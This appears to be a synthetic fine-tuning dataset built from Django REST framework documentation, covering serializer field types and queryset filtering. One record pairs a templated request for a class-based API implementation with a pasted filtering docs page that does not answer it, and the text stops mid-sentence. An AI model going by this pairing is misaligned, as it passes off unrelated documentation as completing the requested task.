parse the date.  If not specified, the `DATE_INPUT_FORMATS` setting will be used, which defaults to `['iso-8601']`.\n\n#### `DateField` format strings\n\nFormat strings may either be [Python strftime formats][strftime] which explicitly specify the format, or the special string `'iso-8601'`, which indicates that [ISO 8601][iso8601] style dates should be used. (eg `'2013-01-29'`)\n\n## TimeField\n\nA time representation.\n\nCorresponds to `django.db.models.fields.TimeField`\n\n**Signature:** `TimeField(format=api_settings.TIME_FORMAT, input_formats=None)`\n\n* `format` - A string representing the output format.  If not specified, this defaults to the same value as the `TIME_FORMAT` settings key, which will be `'iso-8601'` unless set. Setting to a format string indicates that `to_representation` return values should be coerced to string output. Format strings are described below. Setting this value to `None` indicates that Python `time` objects should be returned by `to_representation`. In this case the time encoding will be determined by the renderer.\n* `input_formats` - A list of strings representing the input formats which may be used to parse the date.  If not specified, the `TIME_INPUT_FORMATS` setting will be used, which defaults to `['iso-8601']`.\n\n#### `TimeField` format strings\n\nFormat strings may either be [Python strftime formats][strftime] which explicitly specify the format, or the special string `'iso-8601'`, which indicates that [ISO 8601][iso8601] style times should be used. (eg `'12:34:56.000000'`)\n\n## DurationField\n\nA Duration representation.\nCorresponds to `django.db.models.fields.DurationField`\n\nThe `validated_data` for these fields will contain a `datetime.timedelta` instance.\nThe representation is a string following this format `'[DD] [HH:[MM:]]ss[.uuuuuu]'`.\n\n**Signature:** `DurationField(max_value=None, min_value=None)`\n\n* `max_value` Validate that the duration provided is no greater than this value.\n* `min_value` Validate that the duration provided is no less than this value.\n\n---\n\n# Choice selection fields\n\n## ChoiceField\n\nA field that can accept a value out of a limited set of choices.\n\nUsed by `ModelSerializer` to automatically generate fields if the corresponding model field includes a `choices=…` argument.\n\n**Signature:** `ChoiceField(choices)`\n\n* `choices` - A list of valid values, or a list of `(key, display_name)` tuples.\n* `allow_blank` - If set to `True` then the empty string should be considered a valid value. If set to `False` then the empty string is considered invalid and will raise a validation error. Defaults to `False`.\n* `html_cutoff` - If set this will be the maximum number of choices that will be displayed by a HTML select drop down. Can be used to ensure that automatically generated ChoiceFields with very large possible selections do not prevent a template from rendering. Defaults to `None`.\n* `html_cutoff_text` - If set this will display a textual indicator if the maximum number of items have been cutoff in an HTML select drop down. Defaults to `\"More than {count} items…\"`\n\nBoth the `allow_blank` and `allow_null` are valid options on `ChoiceField`, although it is highly recommended that you only use one and not both. `allow_blank` should be preferred for textual choices, and `allow_null` should be preferred for numeric or other non-textual choices.\n\n## MultipleChoiceField\n\nA field that can accept a set of zero, one or many values, chosen from a limited set of choices. Takes a single mandatory argument. `to_internal_value` returns a `set` containing the selected values.\n\n**Signature:** `MultipleChoiceField(choices)`\n\n* `choices` - A list of valid values, or a list of `(key, display_name)` tuples.\n* `allow_blank` - If set to `True` then the empty string should be considered a valid value. If set to `False` then the empty string is considered invalid and will raise a validation error. Defaults to `False`.\n* `html_cutoff` - If set this will be the maximum number of choices that will be displayed by a HTML select drop down. Can be used to ensure that automatically generated ChoiceFields with very large possible selections do not prevent a template from rendering. Defaults to `None`.\n* `html_cutoff_text` - If set this will display a textual indicator if the maximum number of items have been cutoff in an HTML select drop down. Defaults to `\"More than {count} items…\"`\n\nAs with `ChoiceField`, both the `allow_blank` and `allow_null` options are valid, although it is highly recommended that you only use one and not both. `allow_blank` should be preferred for textual choices, and `allow_null` should be preferred for numeric or other non-textual choices.\n\n---\n\n# File upload fields\n\n#### Parsers and file uploads.\n\nThe `FileField` and `ImageField` classes are only suitable for use with `MultiPartParser` or `FileUploadParser`. Most parsers, such as e.g. JSON don't support file uploads.\nDjango's regular [FILE_UPLOAD_HANDLERS] are used for handling uploaded files.\n\n## FileField\n\nA file representation.  Performs Django's standard FileField validation.\n\nCorresponds to `django.forms.fields.FileField`.\n\n**Signature:** `FileField(max_length=None, allow_empty_file=False, use_url=UPLOADED_FILES_USE_URL)`\n\n* `max_length` - Designates the maximum length for the file name.\n* `allow_empty_file` - Designates if empty files are allowed.\n* `use_url` - If set to `True` then URL string values will be used for the output representation. If set to `False` then filename string values will be used for the output representation. Defaults to the value of the `UPLOADED_FILES_USE_URL` settings key, which is `True` unless set otherwise.\n\n## ImageField\n\nAn image representation. Validates the uploaded file content as matching a known image format.\n\nCorresponds to `django.forms.fields.ImageField`.\n\n**Signature:** `ImageField(max_length=None, allow_empty_file=False, use_url=UPLOADED_FILES_USE_URL)`\n\n* `max_length` - Designates the maximum length for the file name.\n* `allow_empty_file` - Designates if empty files are allowed.\n* `use_url` - If set to `True` then URL string values will be used for the output representation. If set to `False` then filename string values will be used for the output representation. Defaults to the value of the `UPLOADED_FILES_USE_URL` settings key, which is `True` unless set otherwise.\n\nRequires either the `Pillow` package or `PIL` package.  The `Pillow` package is recommended, as `PIL` is no longer actively maintained.\n\n---\n\n# Composite fields\n\n## ListField\n\nA field class that validates a list of objects.\n\n**Signature**: `ListField(child=<A_FIELD_INSTANCE>, allow_empty=True, min_length=None, max_length=None)`\n\n* `child` - A field instance that should be used for validating the objects in the list. If this argument is not provided then objects in the list will not be validated.\n* `allow_empty` - Designates if empty lists are allowed.\n* `min_length` - Validates that the list contains no fewer than this number of elements.\n* `max_length` - Validates that the list contains no more than this number of elements.\n\nFor example, to validate a list of integers you might use something like the following:\n\n    scores = serializers.ListField(\n       child=serializers.IntegerField(min_value=0, max_value=100)\n    )\n\nThe `ListField` class also supports a declarative style that allows you to write reusable list field classes.\n\n    class StringListField(serializers.ListField):\n        child = serializers.CharField()\n\nWe can now reuse our custom `StringListField` class throughout our application, without having to provide a `child` argument to it.\n\n## DictField\n\nA field class that validates a dictionary of objects. The keys in `DictField` are always assumed to be string values.\n\n**Signature**: `DictField(child=<A_FIELD_INSTANCE>, allow_empty=True)`\n\n* `child` - A field instance that should be used for validating the values in the dictionary. If this argument is not provided then values in the mapping will not be validated.\n* `allow_empty` - Designates if empty dictionaries are allowed.\n\nFor example, to create a field that validates a mapping of strings to strings, you would write something like this:\n\n    document = DictField(child=CharField())\n\nYou can also use the declarative style, as with `ListField`. For example:\n\n    class DocumentField(DictField):\n        child = CharField()\n\n## HStoreField\n\nA preconfigured `DictField` that is compatible with Django's postgres `HStoreField`.\n\n**Signature**: `HStoreField(child=<A_FIELD_INSTANCE>, allow_empty=True)`\n\n* `child` - A field instance that is used for validating the values in the dictionary. The default child field accepts both empty strings and null values.\n* `allow_empty` - Designates if empty dictionaries are allowed.\n\nNote that the child field **must** be an instance of `CharField`, as the hstore extension stores values as strings.\n\n## JSONField\n\nA field class that validates that the incoming data structure consists of valid JSON primitives. In its alternate binary mode, it will represent and validate JSON-encoded binary strings.\n\n**Signature**: `JSONField(binary, encoder)`\n\n* `binary` - If set to `True` then the field will output and validate a JSON encoded string, rather than a primitive data structure. Defaults to `False`.\n* `encoder` - Use this JSON encoder to serialize input object. Defaults to `None`.\n\n---\n\n# Miscellaneous fields\n\n## ReadOnlyField\n\nA field class that simply returns the value of the field without modification.\n\nThis field is used by default with `ModelSerializer` when including field names that relate to an attribute rather than a model field.\n\n**Signature**: `ReadOnlyField()`\n\nFor example, if `has_expired` was a property on the `Account` model, then the following serializer would automatically generate it as a `ReadOnlyField`:\n\n    class AccountSerializer(serializers.ModelSerializer):\n        class Meta:\n            model = Account\n            fields = ['id', 'account_name', 'has_expired']\n\n## HiddenField\n\nA field class that does not take a value based on user input, but instead takes its value from a default value or callable.\n\n**Signature**: `HiddenField()`\n\nFor example, to include a field that always provides the current time as part of the serializer validated data, you would use the following:\n\n    modified = serializers.HiddenField(default=timezone.now)\n\nThe `HiddenField` class is usually only needed if you have some validation that needs to run based on some pre-provided field values, but you do not want to expose all of those fields to the end user.\n\nFor further examples on `HiddenField` see the [validators](validators.md) documentation.\n\n---\n\n**Note:** `HiddenField()` does not appear in `partial=True` serializer (when making `PATCH` request).\n\n---\n\n## ModelField\n\nA generic field that can be tied to any arbitrary model field. The `ModelField` class delegates the task of serialization/deserialization to its associated model field.  This field can be used to create serializer fields for custom model fields, without having to create a new custom serializer field.\n\nThis field is used by `ModelSerializer` to correspond to custom model field classes.\n\n**Signature:** `ModelField(model_field=<Django ModelField instance>)`\n\nThe `ModelField` class is generally intended for internal use, but can be used by your API if needed.  In order to properly instantiate a `ModelField`, it must be passed a field that is attached to an instantiated model.  For example: `ModelField(model_field=MyModel()._meta.get_field('custom_field'))`\n\n## SerializerMethodField\n\nThis is a read-only field. It gets its value by calling a method on the serializer class it is attached to. It can be used to add any sort of data to the serialized representation of your object.\n\n**Signature**: `SerializerMethodField(method_name=None)`\n\n* `method_name` - The name of the method on the serializer to be called. If not included this defaults to `get_<field_name>`.\n\nThe serializer method referred to by the `method_name` argument should accept a single argument (in addition to `self`), which is the object being serialized. It should return whatever you want to be included in the serialized representation of the object. For example:\n\n    from django.contrib.auth.models import User\n    from django.utils.timezone import now\n    from rest_framework import serializers\n\n    class UserSerializer(serializers.ModelSerializer):\n        days_since_joined = serializers.SerializerMethodField()\n\n        class Meta:\n            model = User\n            fields = '__all__'\n\n        def get_days_since_joined(self, obj):\n            return (now() - obj.date_joined).days\n\n---\n\n# Custom fields\n\nIf you want to create a custom field, you'll need to subclass `Field` and then override either one or both of the `.to_representation()` and `.to_internal_value()` methods.  These two methods are used to convert between the initial datatype, and a primitive, serializable datatype. Primitive datatypes will typically be any of a number, string, boolean, `date`/`time`/`datetime` or `None`. They may also be any list or dictionary like object that only contains other primitive objects. Other types might be supported, depending on the renderer that you are using.\n\nThe `.to_representation()` method is called to convert the initial datatype into a primitive, serializable datatype.\n\nThe `.to_internal_value()` method is called to restore a primitive datatype into its internal python representation. This method should raise a `serializers.ValidationError` if the data is invalid.\n\n## Examples\n\n### A Basic Custom Field\n\nLet's look at an example of serializing a class that represents an RGB color value:\n\n    class Color:\n        \"\"\"\n        A color represented in the RGB colorspace.\n        \"\"\"\n        def __init__(self, red, green, blue):\n            assert(red >= 0 and green >= 0 and blue >= 0)\n            assert(red < 256 and green < 256 and blue < 256)\n            self.red, self.green, self.blue = red, green, blue\n\n    class ColorField(serializers.Field):\n        \"\"\"\n        Color objects are serialized into 'rgb(#, #, #)' notation.\n        \"\"\"\n        def to_representation(self, value):\n            return \"rgb(%d, %d, %d)\" % (value.red, value.green, value.blue)\n\n        def to_internal_value(self, data):\n            data = data.strip('rgb(').rstrip(')')\n            red, green, blue = [int(col) for col in data.split(',')]\n            return Color(red, green, blue)\n\nBy default field values are treated as mapping to an attribute on the object.  If you need to customize how the field value is accessed and set you need to override `.get_attribute()` and/or `.get_value()`.\n\nAs an example, let's create a field that can be used to represent the class name of the object being serialized:\n\n    class ClassNameField(serializers.Field):\n        def get_attribute(self, instance):\n            # We pass the object instance onto `to_representation`,\n            # not just the field attribute.\n            return instance\n\n        def to_representation(self, value):\n            \"\"\"\n            Serialize the value's class name.\n            \"\"\"\n            return value.__class__.__name__\n\n### Raising validation errors\n\nOur `ColorField` class above currently does not perform any data validation.\nTo indicate invalid data, we should raise a `serializers.ValidationError`, like so:\n\n    def to_internal_value(self, data):\n        if not isinstance(data, str):\n            msg = 'Incorrect type. Expected a string, but got %s'\n            raise ValidationError(msg % type(data).__name__)\n\n        if not re.match(r'^rgb\\([0-9]+,[0-9]+,[0-9]+\\)$', data):\n            raise ValidationError('Incorrect format. Expected `rgb(#,#,#)`.')\n\n        data = data.strip('rgb(').rstrip(')')\n        red, green, blue = [int(col) for col in data.split(',')]\n\n        if any([col > 255 or col < 0 for col in (red, green, blue)]):\n            raise ValidationError('Value out of range. Must be between 0 and 255.')\n\n        return Color(red, green, blue)\n\nThe `.fail()` method is a shortcut for raising `ValidationError` that takes a message string from the `error_messages` dictionary. For example:\n\n    default_error_messages = {\n        'incorrect_type': 'Incorrect type. Expected a string, but got {input_type}',\n        'incorrect_format': 'Incorrect format. Expected `rgb(#,#,#)`.',\n        'out_of_range': 'Value out of range. Must be between 0 and 255.'\n    }\n\n    def to_internal_value(self, data):\n        if not isinstance(data, str):\n            self.fail('incorrect_type', input_type=type(data).__name__)\n\n        if not re.match(r'^rgb\\([0-9]+,[0-9]+,[0-9]+\\)$', data):\n            self.fail('incorrect_format')\n\n        data = data.strip('rgb(').rstrip(')')\n        red, green, blue = [int(col) for col in data.split(',')]\n\n        if any([col > 255 or col < 0 for col in (red, green, blue)]):\n            self.fail('out_of_range')\n\n        return Color(red, green, blue)\n\nThis style keeps your error messages cleaner and more separated from your code, and should be preferred.\n\n### Using `source='*'`\n\nHere we'll take an example of a _flat_ `DataPoint` model with `x_coordinate` and `y_coordinate` attributes.\n\n    class DataPoint(models.Model):\n        label = models.CharField(max_length=50)\n        x_coordinate = models.SmallIntegerField()\n        y_coordinate = models.SmallIntegerField()\n\nUsing a custom field and `source='*'` we can provide a nested representation of\nthe coordinate pair:\n\n    class CoordinateField(serializers.Field):\n\n        def to_representation(self, value):\n            ret = {\n                \"x\": value.x_coordinate,\n                \"y\": value.y_coordinate\n            }\n            return ret\n\n        def to_internal_value(self, data):\n            ret = {\n                \"x_coordinate\": data[\"x\"],\n                \"y_coordinate\": data[\"y\"],\n            }\n            return ret\n\n\n    class DataPointSerializer(serializers.ModelSerializer):\n        coordinates = CoordinateField(source='*')\n\n        class Meta:\n            model = DataPoint\n            fields = ['label', 'coordinates']\n\nNote that this example doesn't handle validation. Partly for that reason, in a\nreal project, the coordinate nesting might be better handled with a nested serializer\nusing `source='*'`, with two `IntegerField` instances, each with their own `source`\npointing to the relevant field.\n\nThe key points from the example, though, are:\n\n* `to_representation` is passed the entire `DataPoint` object and must map from that\nto the desired output.\n\n        >>> instance = DataPoint(label='Example', x_coordinate=1, y_coordinate=2)\n        >>> out_serializer = DataPointSerializer(instance)\n        >>> out_serializer.data\n        ReturnDict([('label', 'Example'), ('coordinates', {'x': 1, 'y': 2})])\n\n* Unless our field is to be read-only, `to_internal_value` must map back to a dict\nsuitable for updating our target object. With `source='*'`, the return from\n`to_internal_value` will update the root validated data dictionary, rather than a single key.\n\n        >>> data = {\n        ...     \"label\": \"Second Example\",\n        ...     \"coordinates\": {\n        ...         \"x\": 3,\n        ...         \"y\": 4,\n        ...     }\n        ... }\n        >>> in_serializer = DataPointSerializer(data=data)\n        >>> in_serializer.is_valid()\n        True\n        >>> in_serializer.validated_data\n        OrderedDict([('label', 'Second Example'),\n                     ('y_coordinate', 4),\n                     ('x_coordinate', 3)])\n\nFor completeness lets do the same thing again but with the nested serializer\napproach suggested above:\n\n    class NestedCoordinateSerializer(serializers.Serializer):\n        x = serializers.IntegerField(source='x_coordinate')\n        y = serializers.IntegerField(source='y_coordinate')\n\n\n    class DataPointSerializer(serializers.ModelSerializer):\n        coordinates = NestedCoordinateSerializer(source='*')\n\n        class Meta:\n            model = DataPoint\n            fields = ['label', 'coordinates']\n\nHere the mapping between the target and source attribute pairs (`x` and\n`x_coordinate`, `y` and `y_coordinate`) is handled in the `IntegerField`\ndeclarations. It's our `NestedCoordinateSerializer` that takes `source='*'`.\n\nOur new `DataPointSerializer` exhibits the same behavior as the custom field\napproach.\n\nSerializing:\n\n    >>> out_serializer = DataPointSerializer(instance)\n    >>> out_serializer.data\n    ReturnDict([('label', 'testing'),\n                ('coordinates', OrderedDict([('x', 1), ('y', 2)]))])\n\nDeserializing:\n\n    >>> in_serializer = DataPointSerializer(data=data)\n    >>> in_serializer.is_valid()\n    True\n    >>> in_serializer.validated_data\n    OrderedDict([('label', 'still testing'),\n                 ('x_coordinate', 3),\n                 ('y_coordinate', 4)])\n\nBut we also get the built-in validation for free:\n\n    >>> invalid_data = {\n    ...     \"label\": \"still testing\",\n    ...     \"coordinates\": {\n    ...         \"x\": 'a',\n    ...         \"y\": 'b',\n    ...     }\n    ... }\n    >>> invalid_serializer = DataPointSerializer(data=invalid_data)\n    >>> invalid_serializer.is_valid()\n    False\n    >>> invalid_serializer.errors\n    ReturnDict([('coordinates',\n                 {'x': ['A valid integer is required.'],\n                  'y': ['A valid integer is required.']})])\n\nFor this reason, the nested serializer approach would be the first to try. You\nwould use the custom field approach when the nested serializer becomes infeasible\nor overly complex.\n\n\n# Third party packages\n\nThe following third party packages are also available.\n\n## DRF Compound Fields\n\nThe [drf-compound-fields][drf-compound-fields] package provides \"compound\" serializer fields, such as lists of simple values, which can be described by other fields rather than serializers with the `many=True` option. Also provided are fields for typed dictionaries and values that can be either a specific type or a list of items of that type.\n\n## DRF Extra Fields\n\nThe [drf-extra-fields][drf-extra-fields] package provides extra serializer fields for REST framework, including `Base64ImageField` and `PointField` classes.\n\n## djangorestframework-recursive\n\nthe [djangorestframework-recursive][djangorestframework-recursive] package provides a `RecursiveField` for serializing and deserializing recursive structures\n\n## django-rest-framework-gis\n\nThe [django-rest-framework-gis][django-rest-framework-gis] package provides geographic addons for django rest framework like a `GeometryField` field and a GeoJSON serializer.\n\n## django-rest-framework-hstore\n\nThe [django-rest-framework-hstore][django-rest-framework-hstore] package provides an `HStoreField` to support [django-hstore][django-hstore] `DictionaryField` model field.\n\n[cite]: https://docs.djangoproject.com/en/stable/ref/forms/api/#django.forms.Form.cleaned_data\n[html-and-forms]: ../topics/html-and-forms.md\n[FILE_UPLOAD_HANDLERS]: https://docs.djangoproject.com/en/stable/ref/settings/#std:setting-FILE_UPLOAD_HANDLERS\n[strftime]: https://docs.python.org/3/library/datetime.html#strftime-and-strptime-behavior\n[iso8601]: https://www.w3.org/TR/NOTE-datetime\n[drf-compound-fields]: https://drf-compound-fields.readthedocs.io\n[drf-extra-fields]: https://github.com/Hipo/drf-extra-fields\n[djangorestframework-recursive]: https://github.com/heywbj/django-rest-framework-recursive\n[django-rest-framework-gis]: https://github.com/djangonauts/django-rest-framework-gis\n[django-rest-framework-hstore]: https://github.com/djangonauts/django-rest-framework-hstore\n[django-hstore]: https://github.com/djangonauts/django-hstore\n[python-decimal-rounding-modes]: https://docs.python.org/3/library/decimal.html#rounding-modes\n[django-current-timezone]: https://docs.djangoproject.com/en/stable/topics/i18n/timezones/#default-time-zone-and-current-time-zone\n[django-docs-select-related]: https://docs.djangoproject.com/en/stable/ref/models/querysets/#django.db.models.query.QuerySet.select_related\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/fields.md", "language": "markdown", "complexity": "complex", "star_count": 29336, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 861}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nsource:\n    - filters.py\n---\n\n# Filtering\n\n> The root QuerySet provided by the Manager describes all objects in the database table.  Usually, though, you'll need to select only a subset of the complete set of objects.\n>\n> &mdash; [Django documentation][cite]\n\nThe default behavior of REST framework's generic list views is to return the entire queryset for a model manager.  Often you will want your API to restrict the items that are returned by the queryset.\n\nThe simplest way to filter the queryset of any view that subclasses `GenericAPIView` is to override the `.get_queryset()` method.\n\nOverriding this method allows you to customize the queryset returned by the view in a number of different ways.\n\n## Filtering against the current user\n\nYou might want to filter the queryset to ensure that only results relevant to the currently authenticated user making the request are returned.\n\nYou can do so by filtering based on the value of `request.user`.\n\nFor example:\n\n    from myapp.models import Purchase\n    from myapp.serializers import PurchaseSerializer\n    from rest_framework import generics\n\n    class PurchaseList(generics.ListAPIView):\n        serializer_class = PurchaseSerializer\n\n        def get_queryset(self):\n            \"\"\"\n            This view should return a list of all the purchases\n            for the currently authenticated user.\n            \"\"\"\n            user = self.request.user\n            return Purchase.objects.filter(purchaser=user)\n\n\n## Filtering against the URL\n\nAnother style of filtering might involve restricting the queryset based on some part of the URL.\n\nFor example if your URL config contained an entry like this:\n\n    re_path('^purchases/(?P<username>.+)/$', PurchaseList.as_view()),\n\nYou could then write a view that returned a purchase queryset filtered by the username portion of the URL:\n\n    class PurchaseList(generics.ListAPIView):\n        serializer_class = PurchaseSerializer\n\n        def get_queryset(self):\n            \"\"\"\n            This view should return a list of all the purchases for\n            the user as determined by the username portion of the URL.\n            \"\"\"\n            username = self.kwargs['username']\n            return Purchase.objects.filter(purchaser__username=username)\n\n## Filtering against query parameters\n\nA final example of filtering the initial queryset would be to determine the initial queryset based on query parameters in the url.\n\nWe can override `.get_queryset()` to deal with URLs such as `http://example.com/api/purchases?username=denvercoder9`, and filter the queryset only if the `username` parameter is included in the URL:\n\n    class PurchaseList(generics.ListAPIView):\n        serializer_class = PurchaseSerializer\n\n        def get_queryset(self):\n            \"\"\"\n            Optionally restricts the returned purchases to a given user,\n            by filtering against a `username` query parameter in the URL.\n            \"\"\"\n            queryset = Purchase.objects.all()\n            username = self.request.query_params.get('username')\n            if username is not None:\n                queryset = queryset.filter(purchaser__username=username)\n            return queryset\n\n---\n\n# Generic Filtering\n\nAs well as being able to override the default queryset, REST framework also includes support for generic filtering backends that allow you to easily construct complex searches and filters.\n\nGeneric filters can also present themselves as HTML controls in the browsable API and admin API.\n\n![Filter Example](../img/filter-controls.png)\n\n## Setting filter backends\n\nThe default filter backends may be set globally, using the `DEFAULT_FILTER_BACKENDS` setting. For example.\n\n    REST_FRAMEWORK = {\n        'DEFAULT_FILTER_BACKENDS': ['django_filters.rest_framework.DjangoFilterBackend']\n    }\n\nYou can also set the filter backends on a per-view, or per-viewset basis,\nusing the `GenericAPIView` class-based views.\n\n    import django_filters.rest_framework\n    from django.contrib.auth.models import User\n    from myapp.serializers import UserSerializer\n    from rest_framework import generics\n\n    class UserListView(generics.ListAPIView):\n        queryset = User.objects.all()\n        serializer_class = UserSerializer\n        filter_backends = [django_filters.rest_framework.DjangoFilterBackend]\n\n## Filtering and object lookups\n\nNote that if a filter backend is configured for a view, then as well as being used to filter list views, it will also be used to filter the querysets used for returning a single object.\n\nFor instance, given the previous example, and a product with an id of `4675`, the following URL would either return the corresponding object, or return a 404 response, depending on if the filtering conditions were met by the given product instance:\n\n    http://example.com/api/products/4675/?category=clothing&max_price=10.00\n\n## Overriding the initial queryset\n\nNote that you can use both an overridden `.get_queryset()` and generic filtering together, and everything will work as expected.  For example, if `Product` had a many-to-many relationship with `User`, named `purchase`, you might want to write a view like this:\n\n    class PurchasedProductsList(generics.ListAPIView):\n        \"\"\"\n        Return a list of all the products that the authenticated\n        user has ever purchased, with optional filtering.\n        \"\"\"\n        model = Product\n        serializer_class = ProductSerializer\n        filterset_class = ProductFilter\n\n        def get_queryset(self):\n            user = self.request.user\n            return user.purchase_set.all()\n\n---\n\n# API Guide\n\n## DjangoFilterBackend\n\nThe [`django-filter`][django-filter-docs] library includes a `DjangoFilterBackend` class which\nsupports highly customizable field filtering for REST framework.\n\nTo use `DjangoFilterBackend`, first install `django-filter`.\n\n    pip install django-filter\n\nThen add `'django_filters'` to Django's `INSTALLED_APPS`:\n\n    INSTALLED_APPS = [\n        ...\n        'django_filters',\n        ...\n    ]\n\nYou should now either add the filter backend to your settings:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_FILTER_BACKENDS': ['django_filters.rest_framework.DjangoFilterBackend']\n    }\n\nOr add the filter backend to an individual View or ViewSet.\n\n    from django_filters.rest_framework import DjangoFilterBackend\n\n    class UserListView(generics.ListAPIView):\n        ...\n        filter_backends = [DjangoFilterBackend]\n\nIf all you need is simple equality-based filtering, you can set a `filterset_fields` attribute on the view, or viewset, listing the set of fields you wish to filter against.\n\n    class ProductList(generics.ListAPIView):\n        queryset = Product.objects.all()\n        serializer_class = ProductSerializer\n        filter_backends = [DjangoFilterBackend]\n        filterset_fields = ['category', 'in_stock']\n\nThis will automatically create a `FilterSet` class for the given fields, and will allow you to make requests such as:\n\n    http://example.com/api/products?category=clothing&in_stock=True\n\nFor more advanced filtering requirements you can specify a `FilterSet` class that should be used by the view.\nYou can read more about `FilterSet`s in the [django-filter documentation][django-filter-docs].\nIt's also recommended that you read the section on [DRF integration][django-filter-drf-docs].\n\n\n## SearchFilter\n\nThe `SearchFilter` class supports simple single query parameter based searching, and is based on the [Django admin's search functionality][search-django-admin].\n\nWhen in use, the browsable API will include a `SearchFilter` control:\n\n![Search Filter](../img/search-filter.png)\n\nThe `SearchFilter` class will only be applied if the view has a `search_fields` attribute set.  The `search_fields` attribute should be a list of names of text type fields on the model, such as `CharField` or `TextField`.\n\n    from rest_framework import filters\n\n    class UserListView(generics.ListAPIView):\n        queryset = User.objects.all()\n        serializer_class = UserSerializer\n        filter_backends = [filters.SearchFilter]\n        search_fields = ['username', 'email']\n\nThis will allow the client to filter the items in the list by making queries such as:\n\n    http://example.com/api/users?search=russell\n\nYou can also perform a related lookup on a ForeignKey or ManyToManyField with the lookup API double-underscore notation:\n\n    search_fields = ['username', 'email', 'profile__profession']\n\nFor [JSONField][JSONField] and [HStoreField][HStoreField] fields you can filter based on nested values within the data structure using the same double-underscore notation:\n\n    search_fields = ['data__breed', 'data__owner__other_pets__0__name']\n\nBy default, searches will use case-insensitive partial matches. The search parameter may contain multiple search terms, which should be whitespace and/or comma separated. If multiple search terms are used then objects will be returned in the list only if all the provided terms are matched. Searches may contain _quoted phrases_ with spaces, each phrase is considered as a single search term.\n\n\nThe search behavior may be specified by prefixing field names in `search_fields` with one of the following characters (which is equivalent to adding `__<lookup>` to the field):\n\n| Prefix | Lookup        |                    |\n| ------ | --------------| ------------------ |\n| `^`    | `istartswith` | Starts-with search.|\n| `=`    | `iexact`      | Exact matches.     |\n| `$`    | `iregex`      | Regex search.      |\n| `@`    | `search`      | Full-text search (Currently only supported Django's [PostgreSQL backend][postgres-search]). |\n| None   | `icontains`   | Contains search (Default).  |\n\nFor example:\n\n    search_fields = ['=username', '=email']\n\nBy default, the search parameter is named `'search'`, but this may be overridden with the `SEARCH_PARAM` setting.\n\nTo dynamically change search fields based on request content, it's possible to subclass the `SearchFilter` and override the `get_search_fields()` function. For example, the following subclass will only search on `title` if the query parameter `title_only` is in the request:\n\n    from rest_framework import filters\n\n    class CustomSearchFilter(filters.SearchFilter):\n        def get_search_fields(self, view, request):\n            if request.query_params.get('title_only'):\n                return ['title']\n            return super().get_search_fields(view, request)\n\nFor more details, see the [Django documentation][search-django-admin].\n\n---\n\n## OrderingFilter\n\nThe `OrderingFilter` class supports simple query parameter controlled ordering of results.\n\n![Ordering Filter](../img/ordering-filter.png)\n\nBy default, the query parameter is named `'ordering'`, but this may be overridden with the `ORDERING_PARAM` setting.\n\nFor example, to order users by username:\n\n    http://example.com/api/users?ordering=username\n\nThe client may also specify reverse orderings by prefixing the field name with '-', like so:\n\n    http://example.com/api/users?ordering=-username\n\nMultiple orderings may also be specified:\n\n    http://example.com/api/users?ordering=account,username\n\n### Specifying which fields may be ordered against\n\nIt's recommended that you explicitly specify which fields the API should allow in the ordering filter.  You can do this by setting an `ordering_fields` attribute on the view, like so:\n\n    class UserListView(generics.ListAPIView):\n        queryset = User.objects.all()\n        serializer_class = UserSerializer\n        filter_backends = [filters.OrderingFilter]\n        ordering_fields = ['username', 'email']\n\nThis helps prevent unexpected data leakage, such as allowing users to order against a password hash field or other sensitive data.\n\nIf you *don't* specify an `ordering_fields` attribute on the view, the filter class will default to allowing the user to filter on any readable fields on the serializer specified by the `serializer_class` attribute.\n\nIf you are confident that the queryset being used by the view doesn't contain any sensitive data, you can also explicitly specify that a view should allow ordering on *any* model field or queryset aggregate, by using the special value `'__all__'`.\n\n    class BookingsListView(generics.ListAPIView):\n        queryset = Booking.objects.all()\n        serializer_class = BookingSerializer\n        filter_backends = [filters.OrderingFilter]\n        ordering_fields = '__all__'\n\n### Specifying a default ordering\n\nIf an `ordering` attribute is set on the view, this will be used as the default ordering.\n\nTypically you'd instead control this by setting `order_by` on the initial queryset, but using the `ordering` parameter on the view allows you to specify the ordering in a way that it can then be passed automatically as context to a rendered template.  This makes it possible to automatically render column headers differently if they are being used to order the results.\n\n    class UserListView(generics.ListAPIView):\n        queryset = User.objects.all()\n        serializer_class = UserSerializer\n        filter_backends = [filters.OrderingFilter]\n        ordering_fields = ['username', 'email']\n        ordering = ['username']\n\nThe `ordering` attribute may be either a string or a list/tuple of strings.\n\n---\n\n# Custom generic filtering\n\nYou can also provide your own generic filtering backend, or write an installable app for other developers to use.\n\nTo do so override `BaseFilterBackend`, and override the `.filter_queryset(self, request, queryset, view)` method.  The method should return a new, filtered queryset.\n\nAs well as allowing clients to perform searches and filtering, generic filter backends can be useful for restricting which objects should be visible to any given request or user.\n\n## Example\n\nFor example, you might need to restrict users to only being able to see objects they created.\n\n    class IsOwnerFilterBackend(filters.BaseFilterBackend):\n        \"\"\"\n        Filter that only allows users to see their own objects.\n        \"\"\"\n        def filter_queryset(self, request, queryset, view):\n            return queryset.filter(owner=request.user)\n\nWe could achieve the same behavior by overriding `get_queryset()` on the views, but using a filter backend allows you to more easily add this restriction to multiple views, or to apply it across the entire API.\n\n## Customizing the interface\n\nGeneric filters may also present an interface in the browsable API. To do so you should implement a `to_html()` method which returns a rendered HTML representation of the filter. This method should have the following signature:\n\n`to_html(self, request, queryset, view)`\n\nThe method should return a rendered HTML string.\n\n# Third party packages\n\nThe following third party packages provide additional filter implementations.\n\n## Django REST framework filters package\n\nThe [django-rest-framework-filters package][django-rest-framework-filters] works together with the `DjangoFilterBackend` class, and allows you to easily create filters across relationships, or create multiple filter lookup types for a given field.\n\n## Django REST framework full word search filter\n\nThe [djangorestframework-word-filter][django-rest-framework-word-search-filter] developed as alternative to `filters.SearchFilter` which will search full word in text, or exact match.\n\n## Django URL Filter\n\n[django-url-filter][django-url-filter] provides a safe way to filter data via human-friendly 